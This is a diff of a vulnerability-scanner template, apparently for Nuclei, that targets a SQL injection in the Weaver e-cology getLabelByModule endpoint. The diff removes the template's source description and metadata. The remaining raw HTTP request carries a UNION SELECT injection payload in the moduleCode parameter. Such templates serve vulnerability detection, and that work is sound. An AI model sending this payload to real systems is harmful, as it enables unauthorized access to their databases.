@@ -3,12 +3,8 @@ info:
   name: 泛微weaver-getLabelByModule-SQL
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qqb1d3fynnf11684'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qqb1d3fynnf11684
-    fofa: 暂无
 http:
 - raw:
   - 'GET /api/ec/dev/locale/getLabelByModule?moduleCode=?moduleCode=?moduleCode=aaa'')+union+all+select+''1,1123123''+-- HTTP/1.1
